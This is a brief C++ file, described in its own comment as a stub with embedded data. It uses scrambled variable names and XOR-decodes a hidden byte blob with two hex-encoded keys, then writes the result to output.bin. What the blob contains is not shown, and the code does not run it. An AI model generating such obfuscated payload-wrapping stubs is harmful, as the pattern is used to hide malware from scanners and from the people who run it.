
#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdint>

// Minimal stub with embedded data
std::string IrOupM3h = "\x36\x33\x36\x33\x35\x32\x35\x35\x35\x35\x36\x32\x35\x32\x36\x62\x36\x32\x36\x38\x36\x32\x36\x33\x36\x33\x35\x32\x35\x35\x35\x35";
std::string rd8zWRRe = "\x35\x31\x62\x36\x62\x37\x32\x34\x38\x64\x34\x32\x35\x33\x39\x30\x38\x39\x38\x65\x61\x66\x62\x63\x34\x35\x39\x61\x63\x62\x61\x38";

int main() {
    uint8_t data[] = {0xed, 0x74, 0x73, 0xed, 0x0e, 0x2b, 0x1f, 0xac, 0x51, 0x86, 0x5b, 0x0a, 0x78, 0x36, 0xed, 0xb6, 0x63, 0x9e, 0x45, 0xa8, 0xe5, 0x06, 0xb6, 0x4c, 0xc1, 0xc1, 0xca, 0xfa, 0x64, 0xef, 0x61, 0x91, 0xb3, 0x09, 0xb6, 0x5e, 0x64, 0x22, 0x6c, 0xf0, 0xf2, 0xd1, 0x54, 0x45, 0xe3, 0x6b, 0x70, 0xc0, 0x49, 0x4c, 0xc3, 0xf7, 0xc9, 0x10, 0x77, 0x15, 0x27, 0x98, 0x9d, 0xc2, 0xa7, 0xc2, 0x03, 0x95, 0xe2, 0x8c, 0x9e, 0xdf, 0xaa, 0x3e, 0x8f, 0xeb, 0x03, 0xa2, 0xb8, 0x44, 0x5e, 0x1f, 0x8b, 0xd7, 0xa4, 0x3f, 0xb4, 0x28, 0x91, 0xa0, 0xf1, 0xcb, 0x93, 0xb3, 0x82, 0x6f, 0x78, 0xde, 0x62, 0x8c, 0x7d, 0x93, 0xdc, 0x2e, 0x1b, 0xed, 0x72, 0xd7, 0xf4, 0xed, 0x74, 0xc4, 0x74, 0xc4, 0x5f, 0xac, 0xbe, 0x95, 0xce, 0x02, 0xdd, 0x70, 0x97, 0x57, 0x54, 0x43, 0x29, 0xe2, 0xb6, 0x8a, 0x9b, 0xa5, 0x81, 0x91, 0x11, 0x34};
    size_t size = sizeof(data);
    
    // Simple XOR decryption
    for (size_t i = 0; i < size; i++) {
        data[i] ^= IrOupM3h[i % 16] ^ rd8zWRRe[i % 16];
    }
    
    std::ofstream out("output.bin", std::ios::binary);
    out.write(reinterpret_cast<char*>(data), size);
    return 0;
}
